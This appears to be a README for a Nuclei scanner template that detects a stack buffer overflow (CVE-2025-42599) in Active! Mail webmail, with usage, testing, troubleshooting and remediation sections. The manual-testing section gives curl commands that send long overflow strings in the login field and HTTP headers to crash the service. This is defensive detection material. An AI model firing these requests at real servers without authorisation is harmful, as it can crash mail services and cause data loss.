# CVE-2025-42599 - Active! Mail Stack-Based Buffer Overflow

## Overview

**CVE ID:** CVE-2025-42599  
**Severity:** Critical (CVSS 9.8)  
**Affected Software:** Active! Mail version 6.60.05008561 and earlier  
**Vulnerability Type:** Stack-based buffer overflow  
**Impact:** Remote Code Execution (RCE) / Denial of Service (DoS)

## Vulnerability Description

Active! Mail version 6.60.05008561 and earlier contains a stack-based buffer overflow vulnerability that allows remote unauthenticated attackers to execute arbitrary code or cause a denial-of-service (DoS) by sending specially crafted requests. The vulnerability is triggered when the application processes certain malformed requests, which overflow a stack buffer.

## Nuclei Template

### Template File
- **Location:** `http/cves/2025/CVE-2025-42599.yaml`
- **Author:** pdresearch
- **Verified:** Yes

### Template Features

#### 1. Multi-Stage Detection
The template implements a three-stage detection approach:

1. **Initial Detection:** Identifies Active! Mail application and extracts version information
2. **Payload Testing:** Tests various buffer overflow payloads via POST requests
3. **Header Manipulation:** Attempts overflow via malformed HTTP headers

#### 2. Payload Variations
- **Basic Overflow:** 1024-byte 'A' pattern
- **Pattern Payload:** Mixed 'B' and 'C' patterns (512 bytes each)
- **Extended Payload:** 2048-byte 'D' pattern for deeper overflow testing

#### 3. Detection Methods
- **Status Code Analysis:** Detects 500/502/503 errors
- **Error Message Matching:** Looks for buffer overflow indicators
- **Header Analysis:** Checks for connection close headers
- **Response Pattern Matching:** Identifies crash signatures

### Template Structure

```yaml
id: CVE-2025-42599
info:
  name: Active! Mail - Stack-Based Buffer Overflow
  severity: critical
  description: |-
    Active! Mail version 6.60.05008561 and earlier contains a stack-based buffer overflow vulnerability...
  
http:
  # Stage 1: Detection and version extraction
  - method: GET
    path: ["{{BaseURL}}/", "{{BaseURL}}/mail/", "{{BaseURL}}/webmail/"]
    
  # Stage 2: POST-based overflow testing
  - method: POST
    path: ["{{BaseURL}}/mail/login", "{{BaseURL}}/webmail/login"]
    payloads:
      username: ["{{overflow_payload}}", "{{pattern_payload}}", "{{extended_payload}}"]
      
  # Stage 3: Header-based overflow testing
  - raw:
      - |
        POST /mail/login HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-For: {{overflow_payload}}
        User-Agent: {{overflow_payload}}
```

## Usage

### Basic Usage
```bash
# Test against a single target
nuclei -u http://target-ip -t http/cves/2025/CVE-2025-42599.yaml

# Test with debug output
nuclei -u http://target-ip -t http/cves/2025/CVE-2025-42599.yaml -debug -v

# Test against multiple targets
nuclei -l targets.txt -t http/cves/2025/CVE-2025-42599.yaml
```

### Advanced Usage
```bash
# Test with custom rate limiting
nuclei -u http://target-ip -t http/cves/2025/CVE-2025-42599.yaml -rate-limit 10

# Test with custom timeout
nuclei -u http://target-ip -t http/cves/2025/CVE-2025-42599.yaml -timeout 30

# Test with custom user agent
nuclei -u http://target-ip -t http/cves/2025/CVE-2025-42599.yaml -H "User-Agent: CustomAgent"
```

## Testing and Validation

### Test Scripts
- **Linux/macOS:** `test-cve-2025-42599.sh`
- **Windows:** `test-cve-2025-42599.bat`

### Manual Testing
```bash
# Test basic connectivity
curl -I http://target-ip/

# Test overflow payload
curl -X POST http://target-ip/mail/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$(python3 -c 'print("A"*1024)')&password=test"

# Test malformed headers
curl -X POST http://target-ip/mail/login \
  -H "X-Forwarded-For: $(python3 -c 'print("A"*1024)')" \
  -H "User-Agent: $(python3 -c 'print("B"*1024)')" \
  -d "username=test&password=test"
```

### Expected Results

#### Vulnerable Systems
- HTTP 500/502/503 status codes
- "Internal Server Error" in response body
- "Buffer", "Overflow", or "Stack" in error messages
- Connection close headers
- Service crash or restart

#### Non-Vulnerable Systems
- HTTP 200/401/403 status codes
- Normal application responses
- No buffer overflow error messages
- Service continues running normally

## Test Environment Setup

### Docker Environment
See `CVE-2025-42599-test-env.md` for detailed Docker setup instructions.

### Virtual Machine Setup
1. Download Active! Mail 6.60.05008561
2. Install on Windows Server 2016/2019 or Windows 10
3. Configure the mail service
4. Ensure service is accessible on port 80/443

## Safety Considerations

⚠️ **WARNING:** This template is designed to trigger buffer overflows and may:
- Crash the target service
- Cause data loss
- Require service restart
- Generate system logs

**Only test against authorized systems in controlled environments.**

## Troubleshooting

### Common Issues

1. **Template not detecting vulnerability**
   - Verify Active! Mail is actually running
   - Check if version is vulnerable (≤6.60.05008561)
   - Ensure proper network connectivity

2. **False positives**
   - Verify version is actually vulnerable
   - Check application logs for crash evidence
   - Monitor system resources during testing

3. **Service not responding**
   - Check if overflow caused crash
   - Verify service restart capability
   - Check system logs for crash reports

### Debug Commands
```bash
# Check service status
systemctl status active-mail

# View application logs
tail -f /var/log/active-mail/error.log

# Monitor system resources
htop
dmesg | tail -20

# Check for core dumps
find /var/crash -name "*.crash" -newer /tmp/test_start
```

## Remediation

### Immediate Actions
1. **Update:** Upgrade to Active! Mail version 6.60.05008562 or later
2. **Network Protection:** Implement WAF rules to block malformed requests
3. **Monitoring:** Enable detailed logging and monitoring
4. **Access Control:** Restrict network access to mail services

### Long-term Actions
1. **Security Assessment:** Conduct comprehensive security review
2. **Patch Management:** Implement automated patch management
3. **Security Training:** Train staff on secure coding practices
4. **Incident Response:** Develop incident response procedures

## References

- **CVE Details:** https://nvd.nist.gov/vuln/detail/CVE-2025-42599
- **MITRE CVE:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-42599
- **Nuclei Documentation:** https://nuclei.projectdiscovery.io/
- **Active! Mail Vendor:** [Vendor URL]

## Contributing

To contribute to this template:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## License

This template is part of the ProjectDiscovery Nuclei Templates project and is licensed under the MIT License.

## Support

For support with this template:
- Create an issue on the GitHub repository
- Check the Nuclei documentation
- Join the ProjectDiscovery community

---

**Note:** This template is designed for security research and authorized testing only. Always obtain proper authorization before testing against any systems.
